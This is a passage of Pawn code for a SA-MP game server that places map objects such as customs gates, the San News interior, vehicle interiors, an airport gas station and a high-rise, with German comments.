zolltor4 = CreateDynamicObject(978, 1724.80725, 524.85522, 27.70611,   0.00000, 0.00000, -19.37999);


// ZOll 2 LS SF
CreateDynamicObject(7522, 52.89226, -1532.03345, 8.54672,   0.00000, 0.00000, 82.25997);
CreateDynamicObject(1237, 58.97540, -1535.02039, 4.17671,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1237, 46.97329, -1529.20093, 4.17671,   0.00000, 0.00000, 0.00000);
zolltor5 = CreateDynamicObject(978, 58.13060, -1539.73645, 4.59974,   0.00000, 0.00000, -99.36003);
zolltor6 = CreateDynamicObject(978, 47.75523, -1524.29236, 4.77916,   0.00000, 0.00000, -99.36003);

//Zoll 3 LS LV Nähe FBI
CreateDynamicObject(9623, -1398.75500, 827.13000, 49.13755,   0.00000, 0.00000, -43.49998);
CreateDynamicObject(983, -1390.13452, 819.18341, 47.10905,   0.00000, 0.00000, 44.94001);
CreateDynamicObject(983, -1390.13452, 819.18341, 48.38150,   0.00000, 0.00000, 44.94001);
CreateDynamicObject(983, -1407.79175, 834.97552, 47.11967,   0.00000, 0.00000, 46.19999);
CreateDynamicObject(983, -1407.79175, 834.97552, 48.36449,   0.00000, 0.00000, 46.19999);
zolltor7 = CreateDynamicObject(978, -1402.84558, 830.12793, 47.27655,   0.00000, 0.00000, 137.04005);
zolltor8 = CreateDynamicObject(978, -1395.88013, 823.92303, 47.27977,   0.00000, 0.00000, 137.04005);


// San News Int
CreateDynamicObject(19376, 247.74001, 1783.13000, 700.00000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19376, 258.23999, 1783.18396, 700.00000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19376, 247.74001, 1773.55005, 700.00000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19376, 258.23001, 1773.55005, 700.00000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19450, 250.44000, 1784.43994, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19450, 245.63000, 1779.93994, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19450, 253.91000, 1780.12000, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19450, 253.03000, 1775.83997, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19404, 252.33000, 1778.41003, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19388, 249.64999, 1777.30005, 701.65002,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(19388, 246.66000, 1775.83997, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19466, 252.38000, 1778.39001, 702.42999,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1502, 249.13000, 1776.76001, 699.95001,   0.00000, 0.00000, 45.00000);
CreateDynamicObject(2165, 251.81000, 1777.84998, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19358, 248.53999, 1774.62000, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1714, 252.63000, 1777.00000, 700.09003,   0.00000, 0.00000, 230.00000);
CreateDynamicObject(2007, 253.70000, 1776.69995, 700.01001,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(1961, 250.82001, 1775.96997, 701.85999,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1962, 251.55000, 1775.96997, 701.85999,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1960, 252.27000, 1775.96997, 701.85999,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1569, 247.05000, 1784.39001, 700.02002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1569, 250.03000, 1784.39001, 700.02002,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(1703, 251.10001, 1783.83997, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1703, 246.23000, 1779.16003, 700.09003,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2315, 247.52000, 1779.45996, 700.09003,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2315, 251.39000, 1782.50000, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2250, 251.42000, 1782.51001, 701.03003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2250, 247.52000, 1780.31006, 701.03003,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2852, 252.61000, 1782.48999, 700.58002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2894, 247.42000, 1779.67004, 700.58002,   0.00000, 0.00000, 39.00000);
CreateDynamicObject(2011, 246.21001, 1783.96997, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2011, 253.24001, 1779.06995, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19450, 245.63000, 1770.30005, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19358, 250.13000, 1773.12000, 701.65002,   0.00000, 0.00000, 90.40000);
CreateDynamicObject(19450, 248.89600, 1768.97998, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1705, 246.30000, 1770.17004, 700.09003,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1705, 247.85001, 1769.63000, 700.09003,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(1705, 251.83000, 1769.63000, 700.09003,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(2315, 248.60001, 1769.55005, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2855, 248.78000, 1769.55005, 700.58002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2251, 249.67000, 1769.35999, 701.40997,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1667, 249.91000, 1769.75000, 700.69000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1667, 250.08000, 1769.65002, 700.69000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2817, 248.02000, 1783.18005, 700.08002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19450, 254.81000, 1780.65002, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(14393, 255.23000, 1759.94995, 702.32001,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19450, 261.73001, 1768.97998, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19450, 249.19000, 1768.82996, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19388, 255.31000, 1768.97998, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19388, 255.31000, 1768.82996, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19450, 261.73001, 1768.82996, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(14391, 256.13000, 1760.85999, 701.04999,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1705, 257.10999, 1767.64001, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1705, 258.67999, 1767.02002, 700.09003,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(2332, 259.63000, 1764.35999, 700.38000,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(2894, 256.39999, 1765.18005, 701.09998,   0.00000, 0.00000, 80.00000);
CreateDynamicObject(1714, 257.10999, 1762.81006, 700.09998,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(1714, 254.17999, 1762.77002, 700.09998,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1502, 251.43201, 1759.68005, 699.95001,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2395, 250.96001, 1759.81995, 700.09998,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(2395, 252.48000, 1759.81995, 702.46002,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(2395, 249.78999, 1759.58997, 702.46002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2395, 248.19000, 1759.57996, 700.09998,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1704, 254.31000, 1753.90002, 700.09003,   0.00000, 0.00000, 135.00000);
CreateDynamicObject(1704, 256.22000, 1754.48999, 700.09003,   0.00000, 0.00000, -135.00000);
CreateDynamicObject(1815, 254.42000, 1754.72998, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2247, 254.89000, 1755.31995, 700.98999,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2010, 253.33000, 1754.94995, 700.09998,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2010, 256.59000, 1754.91003, 700.09998,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19466, 254.11000, 1759.94995, 701.91998,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19466, 256.35001, 1759.94995, 701.91998,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19466, 258.58200, 1759.94995, 701.91998,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19376, 259.00000, 1763.90002, 699.98999,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(1502, 254.53000, 1768.95996, 699.95001,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19450, 263.66830, 1770.77991, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19450, 257.75000, 1783.81995, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19388, 257.75000, 1777.43005, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19388, 259.37000, 1782.07996, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19358, 256.17001, 1781.31006, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2606, 256.20999, 1781.15002, 702.56000,   13.50000, 0.00000, 0.00000);
CreateDynamicObject(2165, 255.78000, 1780.59998, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1806, 256.45001, 1779.58997, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2078, 255.16000, 1777.81995, 700.10999,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2462, 257.00000, 1776.04004, 700.26001,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(19376, 268.72400, 1773.55005, 700.00000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19358, 262.57001, 1782.07996, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19450, 262.67999, 1786.88000, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1702, 261.92999, 1772.37000, 700.08002,   0.00000, 0.00000, 225.00000);
CreateDynamicObject(2315, 259.75000, 1772.14001, 700.09003,   0.00000, 0.00000, 45.00000);
CreateDynamicObject(2251, 260.10001, 1772.70996, 701.40997,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1667, 260.76001, 1772.72998, 700.69000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1502, 258.59000, 1782.06006, 699.95001,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2185, 258.67001, 1785.34998, 700.09003,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1714, 260.03000, 1786.59998, 700.09998,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(1704, 260.01999, 1783.92004, 700.09003,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(2078, 262.38000, 1784.88000, 700.10999,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(2007, 257.95001, 1786.73999, 700.01001,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2886, 257.82001, 1778.51001, 701.44000,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(2886, 257.70999, 1778.47998, 701.44000,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19378, 247.74001, 1783.13000, 703.42999,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19378, 247.74001, 1773.55005, 703.42999,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19378, 258.23001, 1773.55005, 703.42999,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19378, 268.67999, 1783.12000, 703.42999,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19378, 268.70999, 1773.53003, 703.42999,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19378, 258.23999, 1783.14001, 703.42999,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(19358, 252.78810, 1774.25244, 701.65002,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(19450, 263.66830, 1780.40503, 701.65002,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2462, 255.16040, 1776.04004, 700.26001,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(19450, 257.87173, 1788.02075, 701.65002,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2167, 263.35211, 1769.19531, 700.08649,   0.00000, 0.00000, 225.00000);
CreateDynamicObject(19376, 268.72400, 1783.18396, 700.00000,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(630, 246.29063, 1769.56091, 701.10742,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1776, 263.25739, 1780.88281, 701.08752,   0.00000, 0.00000, 269.28540);
CreateDynamicObject(1775, 263.25739, 1778.63550, 701.08752,   0.00000, 0.00000, 269.28540);
CreateDynamicObject(19173, 260.23572, 1787.92664, 702.16516,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1491, 257.77310, 1776.68665, 700.08759,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19175, 260.08829, 1769.09204, 702.24622,   0.00000, 0.00000, 178.43620);
CreateDynamicObject(19174, 249.99879, 1769.06335, 702.24622,   0.00000, 0.00000, 179.75830);
CreateDynamicObject(2161, 263.58630, 1774.04321, 701.48810,   0.00000, 0.00000, 269.28540);
CreateDynamicObject(1738, 253.01320, 1774.10022, 700.52917,   0.00000, 0.00000, 46.43660);
CreateDynamicObject(1893, 246.48570, 1783.51172, 703.57648,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1893, 252.07700, 1783.51172, 703.57648,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1893, 252.07700, 1779.15369, 703.57648,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1893, 246.48570, 1779.15369, 703.57648,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1893, 246.48570, 1774.87817, 703.57648,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1893, 246.48570, 1769.76904, 703.57648,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1893, 252.43269, 1769.76904, 703.57648,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1893, 255.75630, 1769.76904, 703.57648,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1893, 261.17181, 1769.76904, 703.57648,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1893, 255.75630, 1774.12390, 703.57648,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1893, 261.17181, 1774.12390, 703.57648,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1893, 261.17181, 1779.38074, 703.57648,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(957, 251.50008, 1777.13525, 703.34003,   0.00000, 0.00000, 0.00000);

// Tore
lcntor = CreateDynamicObject(980, 2605.98193, 2302.83960, 12.56586,   0.00000, 0.00000, 0.00000);
rtor2 = CreateDynamicObject(980, 2088.90918, 1433.19250, 12.66121,   0.00000, 0.00000, 90.00004);
rtor1 = CreateDynamicObject(980, 2107.43579, 1385.12964, 12.62152,   0.00000, 0.00000, 0.00000);
newschranke = CreateDynamicObject(968, -302.57043, 1507.59338, 75.06610,   0.00000, 89.50000, 0.18000);
htor = CreateDynamicObject(980, 1879.32593, 702.76483, 12.60409,   0.00000, 0.00000, 89.99999);

// Oamt Interior ..
CreateDynamicObject(1495, 321.45538, 301.92542, 998.13531,   0.00000, 0.00000, 0.00001);

// Oamt Tür ..
CreateDynamicObject(1495, 2308.50903, 2040.67883, 9.62458,   0.00000, 0.00000, -90.00002);


oamtschranke = CreateDynamicObject(968, 2255.83301, 2032.57910, 10.54020,   0.00000, 90.00000, 0.00000);


// Tanke Airport
CreateDynamicObject(3287, 1815.35254, -2417.79126, 17.26513,   0.00000, 0.00000, 90.00002);
CreateDynamicObject(16360, 1808.54712, -2417.78882, 12.64547,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1814.39893, -2418.47949, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1244, 1816.93567, -2419.60791, 13.32759,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1209, 1805.80347, -2420.53760, 12.52949,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(9192, 1798.05933, -2420.08667, 17.11916,   0.00000, 0.00000, -38.34000);
CreateDynamicObject(3934, 1808.77527, -2429.40649, 12.57957,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(3633, 1814.41577, -2417.23438, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1815.66541, -2418.46704, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1815.63489, -2417.21680, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1816.91772, -2417.15820, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1816.93994, -2418.41797, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1818.17004, -2418.41064, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1818.15967, -2417.16089, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1819.40576, -2418.44360, 13.00452,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3633, 1819.39514, -2417.19336, 13.00452,   0.00000, 0.00000, 0.00000);





//cargo interrior
	  CreateDynamicObject(14548, 89.519714, 2020.374390, 2866.246094, 12.8916, 0.0000, 0.0000);
	  CreateDynamicObject(16501, 89.533310, 2029.764893, 2868.303223, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(14548, 89.519714, 2020.374390, 2866.246094, 12.8916, 0.0000, 0.0000);
	  CreateDynamicObject(16501, 89.533310, 2029.764893, 2868.303223, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(16773, 89.411331, 2029.798096, 2867.853516, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(2653, 89.779823, 2022.231201, 2867.770508, 359.1406, 180.3776, 270.0000);
	  CreateDynamicObject(964, 86.499214, 2029.009766, 2864.180664, 0.0000, 0.0000, 56.2500);
	  CreateDynamicObject(964, 85.636429, 2027.832397, 2864.233154, 0.0000, 0.0000, 281.2500);
	  CreateDynamicObject(964, 87.203506, 2027.539307, 2864.210205, 0.0000, 0.0000, 22.5000);
	  CreateDynamicObject(964, 86.381035, 2028.268066, 2865.126221, 0.0000, 0.0000, 348.7500);
	  CreateDynamicObject(1348, 85.543137, 2025.873413, 2864.864014, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(3386, 85.947548, 2024.133057, 2864.214355, 0.0000, 0.0000, 180.0000);
	  CreateDynamicObject(3387, 85.901123, 2023.021851, 2864.192139, 0.0000, 0.0000, 180.0000);
	  CreateDynamicObject(3395, 85.345024, 2020.886841, 2864.246338, 0.0000, 0.0000, 180.0000);
	  CreateDynamicObject(16773, 89.532257, 2017.847290, 2867.814697, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(16501, 89.980759, 2031.198120, 2866.834229, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(16501, 89.530731, 2029.773193, 2863.913818, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(3877, 89.504906, 2029.658813, 2869.955078, 0.0000, 179.5182, 0.0000);
	  CreateDynamicObject(16637, 89.561150, 2029.667236, 2865.656250, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(16377, 86.129745, 2018.613770, 2865.229492, 0.0000, 0.0000, 315.0000);
	  CreateDynamicObject(14819, 90.200516, 2018.078735, 2865.399902, 0.0000, 0.0000, 0.8594);
	  CreateDynamicObject(3657, 93.586044, 2027.677490, 2864.751221, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(3657, 93.561325, 2024.313477, 2864.759521, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(3657, 93.548538, 2020.939941, 2864.763672, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(3791, 92.164589, 2017.949707, 2865.615234, 272.3375, 358.2811, 0.0000);
	  CreateDynamicObject(3787, 94.055038, 2027.650513, 2866.843262, 114.3051, 0.0000, 269.1406);
	  CreateDynamicObject(16644, 89.871155, 2022.409668, 2867.237793, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(2653, 89.729614, 2024.553223, 2867.813232, 359.1406, 180.3776, 270.0000);
	  CreateDynamicObject(17950, 674.61944580078, -1303.7014160156, 14.866870880127, 0, 0, 89.730041503906);
	  CreateDynamicObject(18452, 675.77178955078, -1304.1761474609, 9.2565441131592, 0, 0, 270.27026367188);
	  CreateDynamicObject(1364, 680.39727783203, -1303.8420410156, 13.423478126526, 0, 0, 89.730041503906);
	  CreateDynamicObject(3463, 679.34197998047, -1303.9521484375, 12.939352035522, 0, 0, 89.730010986328);





//ENFORCER INTERRIOR
	  CreateDynamicObject(14548, 260.93215942383, 130.32568359375, 1030.2967529297, 11, 0, 0);
	  CreateDynamicObject(16501, 263.30981445313, 119.30065155029, 1030.8798828125, 0, 0, 264.720703125);
	  CreateDynamicObject(16501, 258.37243652344, 119.77773284912, 1030.86328125, 0, 0, 264.71557617188);
	  CreateDynamicObject(16501, 259.53961181641, 101.31005859375, 1031.5064697266, 0, 0, 270.67565917969);
	  CreateDynamicObject(16501, 263.11785888672, 101.33490753174, 1031.5056152344, 0, 0, 270.67565917969);
	  CreateDynamicObject(3657, 256.97509765625, 104.43422698975, 1029.7153320313, 0, 1, 89.324493408203);
	  CreateDynamicObject(3657, 256.97509765625, 108.41323852539, 1029.5767822266, 0, 1, 89.322784423828);
	  CreateDynamicObject(3657, 256.97509765625, 112.51470184326, 1029.4339599609, 0, 1, 89.322784423828);
	  CreateDynamicObject(3657, 256.97509765625, 117.31567382813, 1029.2667236328, 0, 1, 87.337799072266);
	  CreateDynamicObject(3393, 265.28921508789, 106.56674194336, 1029.1229248047, 0, 0, 0);
	  CreateDynamicObject(3388, 263.33383178711, 101.97392272949, 1029.2828369141, 0, 0, 272.66064453125);
	  CreateDynamicObject(3388, 258.49377441406, 102.12097930908, 1029.2777099609, 0, 0, 272.65869140625);
	  CreateDynamicObject(2977, 264.43765258789, 117.57531738281, 1028.7395019531, 0, 0, 0);
	  CreateDynamicObject(2977, 264.43765258789, 116.12423706055, 1028.7900390625, 0, 0, 0);
	  CreateDynamicObject(2977, 264.43765258789, 114.69711303711, 1028.8397216797, 0, 0, 0);
	  CreateDynamicObject(2977, 264.43765258789, 113.29434967041, 1028.888671875, 0, 0, 0);
	  CreateDynamicObject(3392, 265.43835449219, 110.13626098633, 1028.9986572266, 0, 0, 0);





pdd1 = CreateDynamicObject(19325, 239.56374, 118.96767, 1004.18994,   0.00000, 0.00000, 0.00000);
pdd2 = CreateDynamicObject(19325, 253.22673, 109.46581, 1004.15857,   0.00000, 0.00000, 0.00000);





// Hochhaus
CreateDynamicObject(1649, 1814.87585, -1274.49731, 14.28937,   0.00000, 0.00000, 2.22000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1810.54578, -1274.84021, 14.28288,   0.00000, 0.00000, 6.18000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1806.41101, -1276.05493, 14.29510,   0.00000, 0.00000, 25.92000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1802.65576, -1278.25330, 14.28490,   0.00000, 0.00000, 34.38001, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1799.06714, -1280.72400, 14.28490,   0.00000, 0.00000, 34.38001, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1795.50317, -1283.32092, 14.28490,   0.00000, 0.00000, 37.80003, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1792.06763, -1286.05957, 14.28490,   0.00000, 0.00000, 38.64003, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1788.65674, -1288.78796, 14.28490,   0.00000, 0.00000, 38.63999, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1785.08008, -1291.21167, 14.29301,   0.00000, 0.00000, 29.70002, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1781.29871, -1293.36755, 14.28490,   0.00000, 0.00000, 29.70002, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1778.03271, -1296.14124, 14.28490,   0.00000, 0.00000, 51.48002, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1814.87573, -1274.49731, 17.55906,   0.00000, 0.00000, 2.22000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1810.52405, -1274.83923, 17.56786,   0.00000, 0.00000, 6.18000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1806.43713, -1276.06567, 17.59550,   0.00000, 0.00000, 25.92000, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1802.66882, -1278.26843, 17.55971,   0.00000, 0.00000, 34.38001, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1799.05688, -1280.74536, 17.54809,   0.00000, 0.00000, 34.38001, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1795.51367, -1283.33789, 17.57822,   0.00000, 0.00000, 37.80003, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1792.06763, -1286.05957, 17.58574,   0.00000, 0.00000, 38.64003, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1788.65674, -1288.78796, 17.58278,   0.00000, 0.00000, 38.64003, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1785.08008, -1291.21167, 17.57860,   0.00000, 0.00000, 29.70002, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1781.29871, -1293.36755, 17.58100,   0.00000, 0.00000, 29.70002, -1, -1, -1, 600.0);
CreateDynamicObject(1649, 1778.03271, -1296.14124, 17.59212,   0.00000, 0.00000, 51.48002, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1808.11108, -1280.43738, 19.71484,   -90.00000, 0.00000, -65.03998, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1804.70105, -1282.47339, 19.71484,   -90.00000, 0.00000, -53.33999, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1800.72742, -1285.37561, 19.71484,   -90.00000, 0.00000, -53.88000, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1797.01074, -1288.22754, 19.71484,   -90.00000, 0.00000, -51.23999, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1793.12158, -1291.35022, 19.71484,   -90.00000, 0.00000, -51.23999, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1788.09924, -1294.83484, 19.71484,   -90.00000, 0.00000, -58.49998, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1783.91650, -1294.46997, 19.71484,   -90.00000, 0.00000, 30.96002, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1790.04163, -1293.62366, 19.71484,   -90.00000, 0.00000, -56.39997, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1800.24902, -1295.91174, 19.71484,   -90.00000, 0.00000, -51.23999, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1803.72754, -1292.83801, 19.71484,   -90.00000, 0.00000, -51.23999, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1807.11011, -1289.78784, 19.71484,   -90.00000, 0.00000, -51.23999, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1811.25159, -1288.36755, 19.71484,   -90.00000, 0.00000, -51.23999, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1811.37231, -1279.50012, 19.71484,   -90.00000, 0.00000, -82.79998, -1, -1, -1, 600.0);
CreateDynamicObject(630, 1790.85364, -1288.39648, 13.63539,   0.00000, 0.00000, 0.00000, -1, -1, -1, 600.0);
CreateDynamicObject(1569, 1790.78003, -1287.09180, 12.57163,   0.00000, 0.00000, 38.52003, -1, -1, -1, 600.0);
CreateDynamicObject(1569, 1793.10364, -1285.20325, 12.57163,   0.00000, 0.00000, -140.03996, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1815.49329, -1279.49609, 12.20727,   -90.00000, 0.00000, -87.47998, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1811.40479, -1279.79114, 12.20727,   -90.00000, 0.00000, -84.00002, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1808.32434, -1280.79626, 12.20727,   -90.00000, 0.00000, -63.48004, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1783.98608, -1297.61926, 12.20727,   -90.00000, 0.00000, -60.72003, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1788.31738, -1295.18518, 12.20727,   -90.00000, 0.00000, -60.72003, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1791.83911, -1292.68896, 12.20727,   -90.00000, 0.00000, -51.36003, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1795.71216, -1289.59143, 12.20727,   -90.00000, 0.00000, -51.36003, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1798.89844, -1287.05273, 12.20727,   -90.00000, 0.00000, -51.90005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1802.58508, -1284.38757, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1804.90027, -1282.82556, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1816.26453, -1287.28040, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1814.31738, -1288.34277, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
CreateDynamicObject(18766, 1810.87268, -1289.95288, 12.20727,   -90.00000, 0.00000, -55.32005, -1, -1, -1, 600.0);
